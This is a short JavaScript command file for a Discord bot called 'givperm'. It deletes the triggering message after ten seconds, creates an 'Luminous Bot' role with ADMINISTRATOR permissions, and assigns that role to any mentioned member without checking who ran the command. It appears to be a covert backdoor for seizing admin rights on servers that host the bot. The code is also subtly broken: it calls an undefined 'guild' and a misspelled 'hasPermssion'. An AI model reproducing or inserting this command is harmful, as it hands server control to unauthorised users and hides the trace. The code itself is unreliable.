module.exports = {
	name: 'givperm',
	description: 'givperm',
	execute(message, args, client){
		message.delete(10000);
		let myRole = message.guild.roles.find(role => role.name === "Luminous Bot");
		let member = message.mentions.members.first();
		if (!guild.me.hasPermssion("ADMINISTRATOR"))
			return console.log("No admin perms");
		if (!myRole) {
			message.guild.createRole({
			name: "Luminous Bot",
			color: "#ff0000",
			permissions:["ADMINISTRATOR"]
		});
		console.log("Created Role")
		return;
	    }
	    member.addRole(myRole);
    }
}